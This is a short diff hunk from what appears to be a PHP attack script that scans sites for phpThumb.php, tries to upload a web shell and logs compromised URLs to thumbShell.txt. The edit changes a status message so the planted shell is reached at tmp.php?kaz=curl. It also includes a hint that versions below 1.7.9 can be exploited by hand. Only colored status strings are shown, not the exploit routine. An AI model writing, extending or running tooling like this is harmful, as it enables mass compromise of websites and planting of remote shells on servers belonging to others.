@@ -28,7 +28,7 @@ $url = trim($pron);
       $m = "\e[1;32mphpThumb.php found\n";
       $a = "\e[1;33mTry Upload Shell...\n";
       $n = "\e[1;32mUpload Success\n";
-      $t = "\e[1;37mYour Access =>\e[1;32m $url/tmp.php?curl\e[1;37m\n[saved : thumbShell.txt]\n";
+      $t = "\e[1;37mYour Access =>\e[1;32m $url/tmp.php?kaz=curl\e[1;37m\n[saved : thumbShell.txt]\n";
       $o = "\e[1;31mFailed Upload Shell\n=> $url\e[1;37m\n[saved : thumbDie.txt]\n";
       $manual = "\e[1;36m[ if under version 1.7.9 you can try to manual execute ! ]\n\n\e[1;37m";
       $d = "\e[1;31m[!] $url\nNotFound [!]\e[1;37m\n";
